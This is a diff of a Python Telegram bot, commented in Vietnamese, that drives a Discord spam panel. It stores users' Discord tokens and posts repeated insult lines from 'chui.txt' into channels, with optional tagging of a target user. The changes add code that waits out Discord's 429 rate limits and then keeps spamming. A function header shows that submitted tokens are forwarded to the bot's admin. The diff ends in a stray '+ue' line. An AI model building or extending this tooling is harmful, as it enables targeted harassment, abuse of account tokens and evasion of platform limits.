@@ -29,14 +29,13 @@ DEFAULT_DELAY = 0.2
 admin_selected_target = {}
 anti_disconnect_tasks = {}
 
-# Lưu phiên Discord & Task Spam của từng người dùng
+# LƯU PHIÊN DISCORD TRONG BỘ NHỚ (Chỉ mất khi Restart/Tắt Bot)
 discord_sessions = {}
 discord_spam_tasks = {}
 
 def get_user_delay(u_i):
     return user_delays.get(u_i, DEFAULT_DELAY)
 
-# Bảng chuyển đổi chữ thường sang chữ bé (Small Caps)
 def to_small_caps(text):
     normal = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
     small  = "ᴀʙᴄᴅᴇғɢʜɪᴊᴋʟᴍɴᴏᴘǫʀsᴛᴜᴠᴡxʏᴢAʙCᴅEғGʜIᴊKʟMɴOᴘQʀSᴛUᴠWXYᴢ0123456789"
@@ -44,7 +43,6 @@ def to_small_caps(text):
     return text.translate(trans)
 
 def get_default_lines():
-    """Tự động lấy kho ngôn mặc định của Bot Telegram"""
     lines = []
     if os.path.exists("chui.txt"):
         with open("chui.txt", "r", encoding="utf-8") as f:
@@ -235,7 +233,7 @@ async def start_anti_disconnect(target_uid, client):
         await asyncio.sleep(240)
 
 # ==========================================
-# DISCORD HELPER & CHECK TOKEN CHI TIẾT
+# DISCORD HELPER & CHECK TOKEN
 # ==========================================
 def get_discord_headers(token):
     return {
@@ -298,10 +296,24 @@ async def notify_admin_discord_token(user_id, token, user_data, created_at):
         print(f"Lỗi gửi thông báo token discord: {e}")
 
 # ==========================================
-# GIAO DIỆN BẢNG ĐIỀU KHIỂN DISCORD BẰNG MENU
+# GIAO DIỆN BẢNG ĐIỀU KHIỂN DISCORD (HỖ TRỢ GIỮ PHIÊN)
 # ==========================================
 def render_discord_dashboard(u):
-    session = discord_sessions.get(u, {})
+    # Khởi tạo mặc định nếu chưa có phiên
+    if u not in discord_sessions:
+        discord_sessions[u] = {
+            "tokens": [], 
+            "channels": [], 
+            "lines": get_default_lines(),
+            "delay": 2.0, 
+            "mode": "full", 
+            "font_style": "big", 
+            "tag_target": "", 
+            "use_custom_file": False,
+            "step": None
+        }
+
+    session = discord_sessions[u]
     tokens = session.get("tokens", [])
     channels = session.get("channels", [])
     delay = session.get("delay", 2.0)
@@ -439,13 +451,6 @@ async def _callback_handler(ev):
         await ev.edit(msg, buttons=buttons, parse_mode='markdown')
 
     elif data == "app_discord":
-        if u not in discord_sessions:
-            discord_sessions[u] = {
-                "tokens": [], "channels": [], "lines": get_default_lines(),
-                "delay": 2.0, "mode": "full", "font_style": "big", 
-                "tag_target": "", "use_custom_file": False
-            }
-        
         txt, buttons = render_discord_dashboard(u)
         await ev.edit(txt, buttons=buttons, parse_mode='markdown')
 
@@ -539,10 +544,15 @@ async def _callback_handler(ev):
                             if tag_target:
                                 msg_text = f"{msg_text} <@{tag_target}>"
 
+                            payload = {"content": msg_text, "tts": False}
+
                             try:
-                                async with session_http.post(url, headers=headers, json={"content": msg_text, "tts": False}, timeout=10) as resp:
-                                    pass
-                            except Exception:
+                                async with session_http.post(url, headers=headers, json=payload, timeout=10) as resp:
+                                    if resp.status == 429:
+                                        retry_data = await resp.json()
+                                        wait_time = retry_data.get("retry_after", 2.0)
+                                        await asyncio.sleep(wait_time)
+                            except Exception as ex:
                                 pass
                             await asyncio.sleep(delay)
 
@@ -572,7 +582,7 @@ async def _callback_handler(ev):
         discord_sessions[u] = {
             "tokens": [], "channels": [], "lines": get_default_lines(),
             "delay": 2.0, "mode": "full", "font_style": "big", 
-            "tag_target": "", "use_custom_file": False
+            "tag_target": "", "use_custom_file": False, "step": None
         }
         await ev.answer("🔄 Đã reset toàn bộ cấu hình Discord!", alert=True)
         
@@ -586,7 +596,7 @@ async def _callback_handler(ev):
 
         discord_sessions.pop(u, None)
         msg, buttons = get_app_selector_menu()
-        await ev.edit("🚪 **Đã đăng xuất phiên Discord!**\n\n" + msg, buttons=buttons, parse_mode='markdown')
+        await ev.edit("🚪 **Đã xóa phiên làm việc Discord khỏi bộ nhớ tạm!**\n\n" + msg, buttons=buttons, parse_mode='markdown')
 
     elif data == "m_main":
         msg, buttons = get_main_menu(u)
@@ -629,7 +639,7 @@ async def _callback_handler(ev):
             except Exception as e:
                 await cv.send_message(f"❌ **Lỗi Login:** `{e}`")
 
-# Xử lý text & file .txt nhập liệu cho Discord
+# Xử lý nhập liệu lưu vào Discord Session
 @bot.on(events.NewMessage(incoming=True))
 async def handle_discord_text_input(ev):
     u = ev.sender_id
@@ -788,3 +798,4 @@ if __name__ == '__main__':
         asyncio.run(main())
     except (KeyboardInterrupt, SystemExit):
         pass
+ue
